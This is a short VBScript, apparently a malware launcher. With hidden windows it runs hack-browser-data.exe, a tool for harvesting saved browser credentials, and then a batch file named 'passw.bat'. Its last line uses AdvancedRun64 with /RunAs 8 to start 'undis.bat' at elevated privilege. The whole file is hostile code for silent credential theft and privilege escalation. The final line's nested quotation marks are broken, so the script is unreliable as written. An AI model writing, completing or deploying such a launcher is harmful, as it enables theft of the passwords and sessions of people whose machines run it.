Set oShell = CreateObject("WScript.Shell")
oShell.Run "hack-browser-data.exe", 0
Set oShell = CreateObject("WScript.Shell")
oShell.Run "passw.bat", 0, true
Set shell = CreateObject("WScript.Shell")
shell.Run "start AdvancedRun64.exe /EXEFilename "undis.bat" /RunAs 8 /Run"
